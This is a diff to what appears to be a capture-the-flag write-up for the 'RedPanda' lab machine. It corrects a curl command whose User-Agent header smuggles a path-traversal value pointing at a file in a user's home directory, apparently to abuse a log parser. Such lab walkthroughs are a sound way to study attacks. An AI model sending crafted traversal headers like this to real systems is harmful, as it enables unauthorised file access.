@@ -904,7 +904,7 @@ and that's super helpful, since while we have sources for `LogParser` class, we 
 this.. should work:
 
 ```
-$ curl http://redpanda.htb:8080/it/doesnt/matter -H "User-Agent: curl/7.x.x||../../../../../../home/woodenk/foo.jpg"
+$ curl http://redpanda.htb:8080/it/doesnt/matter -H "User-Agent: curl/7.x.x||/../../../../../../home/woodenk/foo.jpg"
 ```
 
 ## flag
